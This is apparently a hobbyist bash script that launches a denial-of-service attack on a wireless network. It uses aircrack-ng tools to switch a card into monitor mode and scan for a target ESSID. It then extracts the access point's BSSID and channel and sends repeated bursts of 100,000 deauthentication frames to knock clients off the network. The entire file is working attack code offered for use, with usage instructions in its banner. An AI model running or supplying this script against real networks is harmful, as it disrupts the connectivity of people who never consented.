#!/bin/bash

#colors

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

echo -e "$blueColour START A QUICKLY DoS ATTACK TO WIRELESS NETWORK $endColour"
echo -e "---------- Christian VR aka Kittay"

echo -e "> $yellowColour[!]USING$endColour: The firts argument take the ESSID targeted network
         > the second argument take you'r interface network card
         > and the last argument take the channel target [optional but more efective]"

echo -e "\n"
deact=$(sudo ifconfig wlan0 down) #deactivate 

# Execute aircrack-ng
init=$(airmon-ng start wlan0)
imp=$(sudo airmon-ng check kill)

echo -e "$imp"

targeted="$1"
interface="$2"
channel=$3

function wiredos (){

  essid_name="$1"

	echo -e "\n"
	echo -e "\t$greenColour essid name targeted: $1"
	echo -e "\tthe interface network selected: $2"
	echo -e "\tthe channel selected: $3 $endColour"

  if [[ $3 -ge 1 && $3 -le 15 ]]; then

    sudo airodump-ng "$2" --essid-regex "^$1" --write output --output-format kismet --channel $3 --write-interval 1
    channel=$(cat output-01.kismet.csv | grep "$1" | awk -F ';' '{print $6}') #get channel 
    
  else

    sudo airodump-ng "$2" --essid-regex "^$1" --write output --output-format kismet --write-interval 1 

  fi

	if [[ $(cat output-01.kismet.csv | wc -l) -gt 1 ]]; then

    essid=$(cat output-01.kismet.csv | grep "$1" | awk -F ';' '{print $3}' | uniq)
    bssid=$(cat output-01.kismet.csv | grep "$1" | awk -F ';' '{print $4}' | uniq | tail -n 1)
    rm -rf output* # Delete dump files

	fi

  rm -rf output*

  for i in $(seq 1 3); do

    echo -e "\n"
    echo -e "\t $greenColour Sending $i deauthentication attacks $endColour"
    echo -e "\n"
    echo -e "\tSTART DoS ATTACK TO:$redColour $essid $endColour"
    echo -e "\tMAC ADRESS TARGETED:$redColour $bssid $endColour"
    echo -e "\n"

    # ------------------- STARTING ATTACK ----------------------------------

    sudo aireplay-ng --deauth 100000 -a "$bssid" "$2"

  done
 
}

#get parameter
wiredos $targeted $interface $channel
